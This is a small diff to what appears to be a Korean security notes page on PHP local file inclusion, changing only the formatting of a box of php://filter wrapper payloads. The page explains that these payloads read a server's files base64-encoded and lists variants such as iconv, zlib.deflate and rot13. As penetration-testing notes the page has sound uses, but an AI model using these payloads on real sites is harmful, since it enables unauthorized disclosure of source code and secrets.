@@ -115,11 +115,11 @@ http://[site]/index.php?page=php://filter/convert.base64-encode/resource=FILE
 위와같이 보낼경우 FILE은 base64로 인코딩된 값을 받아오며, 이를 다시 디코딩하게되면 확인할 수 있다.
 
 <div class="notice">
-- php://filter/convert.base64-encode/resource=FILE
-- php://filter/convert.iconv.utf-8.utf-16/resource=FILE
-- php://filter/convert.base64-encode/resource=FILE
-- php://filter/zlib.deflate/convert.base64-encode/resource=FILE
-- rot13 사용도 생각해두자.
+php://filter/convert.base64-encode/resource=FILE<br>
+php://filter/convert.iconv.utf-8.utf-16/resource=FILE<br>
+php://filter/convert.base64-encode/resource=FILE<br>
+php://filter/zlib.deflate/convert.base64-encode/resource=FILE<br>
+rot13 사용도 생각해두자.
 </div>
 
 ## PHP ZIP
